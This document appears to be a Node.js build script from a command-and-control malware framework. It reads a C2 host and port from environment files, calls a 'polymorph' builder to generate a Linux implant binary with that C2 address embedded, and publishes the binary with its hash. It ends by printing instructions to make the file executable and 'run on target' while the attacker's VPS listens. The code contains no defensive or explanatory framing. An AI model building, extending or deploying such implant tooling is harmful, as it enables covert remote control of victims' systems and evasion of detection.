#!/usr/bin/env node
/**
 * Build Linux implant binary using .env.production C2 settings (must match VPS TCP_PORT).
 */
const path = require('path');
const fs = require('fs');
const dotenv = require('dotenv');

const root = path.join(__dirname, '..');
const workingDir = path.join(root, 'builds', 'working');
const prodEnv = path.join(root, '.env.production');
const fallback = path.join(root, '.env');

const cli = {
  BUILD_C2_HOST: process.env.BUILD_C2_HOST,
  BUILD_C2_PORT: process.env.BUILD_C2_PORT,
  TCP_PORT: process.env.TCP_PORT,
  ENABLE_443_SPLIT: process.env.ENABLE_443_SPLIT,
  PLAIN_PORT: process.env.PLAIN_PORT,
};

if (fs.existsSync(prodEnv)) {
  dotenv.config({ path: prodEnv, override: true });
} else if (fs.existsSync(fallback)) {
  dotenv.config({ path: fallback, override: true });
}
for (const [k, v] of Object.entries(cli)) {
  if (v !== undefined && v !== '') process.env[k] = v;
}

function is443SplitEnabled() {
  const v = process.env.ENABLE_443_SPLIT;
  return v === '1' || v === 'true' || v === 'yes';
}

function resolveEmbedPort() {
  if (is443SplitEnabled()) {
    return Number(process.env.BUILD_C2_PORT || process.env.SPLIT_PORT || 443);
  }
  const httpPort = Number(process.env.PORT || 5000);
  let tcp = Number(process.env.TCP_PORT || process.env.BUILD_C2_PORT || 2026);
  if (tcp === httpPort) tcp = 2026;
  return tcp;
}

const host = String(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '').trim();
const port = resolveEmbedPort();

if (!host) {
  console.error('Set BUILD_C2_HOST in .env.production');
  process.exit(1);
}

process.env.APP_ENV = 'production';

const { generateBuild } = require('../builder/polymorph');
const { BUILDS_DIR } = require('../builder/polymorph');

function publishLinuxBin(meta) {
  const src = path.join(BUILDS_DIR, meta.id, meta.fileName);
  if (!fs.existsSync(src)) return null;
  fs.mkdirSync(workingDir, { recursive: true });
  const named = path.join(workingDir, meta.fileName);
  const latest = path.join(workingDir, 'latest-linux');
  fs.copyFileSync(src, named);
  fs.copyFileSync(src, latest);
  const metaOut = {
    id: meta.id,
    fileName: meta.fileName,
    platform: 'linux',
    host: meta.host,
    port: meta.port,
    sha256: meta.sha256,
    workingBin: named,
    latestLinux: latest,
    createdAt: meta.createdAt,
  };
  fs.writeFileSync(path.join(workingDir, 'latest-linux-meta.json'), JSON.stringify(metaOut, null, 2));
  return { named, latest, metaOut };
}

generateBuild({
  platform: 'linux',
  arch: 'amd64',
  variant: 'implant',
  host,
  port,
})
  .then((m) => {
    const published = publishLinuxBin(m);
    console.log('\n=== Production Linux implant ready ===');
    console.log('C2 (embedded):', m.host + ':' + m.port);
    console.log('File:', published?.latest || path.join(BUILDS_DIR, m.id, m.fileName));
    console.log('SHA256:', m.sha256);
    console.log('Deploy: chmod +x ' + (published?.latest || m.fileName) + ' && run on target');
    console.log('VPS must show: [TCP] Server listening on 0.0.0.0:' + port);
  })
  .catch((e) => {
    console.error('Build failed:', e.message);
    process.exit(1);
  });
